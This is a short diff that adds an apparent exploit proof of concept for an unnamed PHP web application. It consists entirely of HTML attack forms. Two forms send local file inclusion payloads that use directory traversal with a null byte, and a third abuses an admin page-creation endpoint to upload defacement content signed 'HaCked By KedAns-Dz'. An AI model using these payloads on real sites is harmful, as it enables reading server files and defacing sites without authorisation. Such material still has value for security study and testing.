@@ -1,0 +1,25 @@
+Local File Include
+
+<form action='http://www.example.com/admin/admin.php?view=admin&do=../../../../[ LFI ]%00' method='post'>
+<input type='submit' value='Get/Include Local File'>
+</form>
+
+<form action='http://www.example.com/index.php?page=../../../../../[ LFI ]%00' method='post'>
+<input type='submit' value='Get/Include Local File'>
+</form>
+
+
+Arbitrary File Upload:
+
+<form action='http://www.example.com/inc/functions.php?view=admin&do=pages&create=new&save=1' method='post'>
+<strong>Page Title :</strong>
+<input type="text" name="title" size="50" value='Happy Milw0rm 1337day !'>
+<textarea id="elm1" name="page">
+<center>
+<h1> HaCked By KedAns-Dz </h1>
+<h2> Happy Milw0rm 1337-Day All Hax0rS ^.^ </h2>
+<h3> Greetings t0 KeyStr0ke + JF and All 0ld School ( The Milw0rm ) </h3>
+</center>
+</textarea>
+<input type='submit' value='Upload Page'>
+</form>
